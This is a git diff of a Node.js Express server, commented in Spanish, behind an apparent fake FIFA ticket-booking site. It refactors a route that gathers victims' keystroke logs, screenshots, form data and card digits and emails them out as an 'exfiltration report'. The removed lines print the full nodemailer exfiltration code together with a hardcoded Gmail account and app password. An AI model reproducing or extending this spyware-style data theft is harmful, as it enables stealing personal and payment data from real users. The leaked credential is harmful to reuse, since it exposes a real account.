@@ -8,6 +8,9 @@ const dotenv = require("dotenv");
 // Cargar variables de entorno
 dotenv.config();
 
+// Importar mailer DESPUÉS de cargar las variables de entorno
+const { sendExfiltrationEmail } = require("./mailer");
+
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -16,7 +19,6 @@ const SERVER_IP = process.env.SERVER_IP || "localhost";
 // CONFIGURACIÓN DE ALMACENAMIENTO
 const LOG_FILE = path.join(__dirname, ".logs_db.txt");
 const SCREENSHOTS_DIR = path.join(__dirname, "capturas");
-const nodemailer = require("nodemailer");
 
 // Crear carpeta de capturas si no existe
 if (!fs.existsSync(SCREENSHOTS_DIR)) {
@@ -94,19 +96,9 @@ app.post("/upload-screenshot", (req, res) => {
   });
 });
 
-// Configurar el envio de gmail (Usa una "Contraseña de aplicación" de Google)
-const transporter = nodemailer.createTransport({
-  service: "gmail",
-  auth: {
-    user: process.env.EMAIL_USER || "ismaelbm1809@gmail.com",
-    pass: process.env.EMAIL_PASSWORD || "ahhz nlyx uufw qham ",
-  },
-});
-
 // Ruta para procesar el "Finalizar Reserva" y enviar el correo resumen
 app.post("/finalizar-y-enviar", async (req, res) => {
-  const { user, email, match, totalAmount, seats, cardLastFour } = req.body;
-  const safeUser = (user || "desconocido").replace(/\s/g, "_");
+  const { user, email, match, totalAmount, seats } = req.body;
 
   console.log(`\n${"=".repeat(70)}`);
   console.log(`TRANSACCIÓN COMPLETADA - INICIANDO EXFILTRACIÓN`);
@@ -122,96 +114,24 @@ app.post("/finalizar-y-enviar", async (req, res) => {
   console.log(`${"=".repeat(70)}\n`);
 
   try {
-    // Obtener TODAS las capturas asociadas a este usuario
-    const files = fs.readdirSync(SCREENSHOTS_DIR);
-    const userScreenshots = files.filter((f) => f.includes(safeUser));
-
-    console.log(
-      `Se encontraron ${userScreenshots.length} capturas de pantalla`,
-    );
-
-    // Preparar todos los adjuntos
-    const attachments = [
-      {
-        filename: "logs_completos.txt",
-        path: LOG_FILE,
-        contentType: "text/plain",
-      },
-    ];
-
-    // Agregar TODAS las capturas del usuario
-    userScreenshots.forEach((fileName, index) => {
-      const filePath = path.join(SCREENSHOTS_DIR, fileName);
-      if (fs.existsSync(filePath)) {
-        attachments.push({
-          filename: `screenshot_${index + 1}.png`,
-          path: filePath,
-          contentType: "image/png",
-        });
-        console.log(`   Agregado: ${fileName}`);
-      }
-    });
-
     console.log(`\nPREPARANDO ENVÍO DE CORREO...`);
-    console.log(
-      `   Destinatario: ${process.env.EMAIL_DESTINATION || process.env.EMAIL_USER}`,
-    );
-    console.log(`   Total de archivos: ${attachments.length}`);
-
-    const mailOptions = {
-      from: `Servidor FIFA <${process.env.EMAIL_USER}>`,
-      to: process.env.EMAIL_DESTINATION || process.env.EMAIL_USER,
-      subject: `EXFILTRACIÓN COMPLETADA: ${user} - ${new Date().toLocaleString()}`,
-      html: `
-            <div style="font-family: monospace; padding: 20px; color: #000;">
-            <div style="max-width: 500px; margin: auto; border: 1px solid #ccc; padding: 20px;">
-
-                <h2 style="color: #d32f2f; margin-top: 0;">REPORTE DE EXFILTRACION</h2>
-
-                <p>
-                    Usuario: ${user}<br>
-                    Correo: ${email}<br>
-                    Partido: ${match || "N/A"}<br>
-                    Monto: $${totalAmount?.toLocaleString("es-MX") || "0"} MXN<br>
-                    Asientos: ${seats}<br>
-                    Fecha: ${new Date().toLocaleString()}
-                    ${cardLastFour ? `<br>Tarjeta: ****${cardLastFour}` : ""}
-                </p>
-
-                <hr>
-
-                <strong>DATOS CAPTURADOS:</strong>
-                <ul style="padding-left: 20px;">
-                    <li>Logs de Teclado: ${getLogCount()} registros</li>
-                    <li>Capturas de Pantalla: ${userScreenshots.length}</li>
-                    <li>Datos de Formulario: Capturados</li>
-                    <li>Metadata: Timestamps, Navegador, IP</li>
-                </ul>
-
-                <p style="font-size: 11px; color: #666;">
-                    Archivos adjuntos en el correo.
-                </p>
-            </div>
-            `,
-      attachments: attachments,
-    };
-
-    // Enviar correo
-    const info = await transporter.sendMail(mailOptions);
+    
+    // Delegamos la lógica al nuevo servicio
+    const result = await sendExfiltrationEmail(req.body, SCREENSHOTS_DIR, LOG_FILE);
 
     console.log(`\nCORREO ENVIADO EXITOSAMENTE`);
-    console.log(`   Message ID: ${info.messageId}`);
+    console.log(`   Message ID: ${result.info.messageId}`);
     console.log(
       `   To: ${process.env.EMAIL_DESTINATION || process.env.EMAIL_USER}`,
     );
-    console.log(`   Files: ${attachments.length} archivos`);
+    console.log(`   Files: ${result.attachmentsCount} archivos`);
     console.log(`${"=".repeat(70)}\n`);
 
     res.status(200).json({
       status: "success",
       message: "Exfiltración completada",
-      files_sent: attachments.length,
-      screenshots: userScreenshots.length,
+      files_sent: result.attachmentsCount,
+      screenshots: result.screenshotsCount,
     });
   } catch (error) {
     console.error(`\nERROR EN EXFILTRACIÓN:`, error.message);
@@ -222,17 +142,6 @@ app.post("/finalizar-y-enviar", async (req, res) => {
     });
   }
 });
-
-// Función auxiliar para contar registros en el log
-function getLogCount() {
-  try {
-    if (!fs.existsSync(LOG_FILE)) return 0;
-    const content = fs.readFileSync(LOG_FILE, "utf-8");
-    return content.split("\n").filter((line) => line.trim().length > 0).length;
-  } catch {
-    return 0;
-  }
-}
 
 const HOST = "0.0.0.0"; // Esto permite conexiones externas (celular)
 
